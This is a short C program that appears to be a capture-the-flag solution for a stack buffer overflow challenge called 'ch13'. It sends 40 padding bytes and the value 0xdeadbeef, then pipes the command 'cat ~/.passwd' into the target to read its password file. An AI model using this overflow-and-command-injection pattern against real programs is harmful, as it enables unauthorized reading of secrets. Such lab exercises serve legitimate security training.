#include <stdio.h>
int		main(void)
{
	write(1, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", 40);
	int c = 0xdeadbeef;
	write(1, &c, 4);
	printf("cat ~/.passwd");
	system("./a.out | ~/ch13");
}
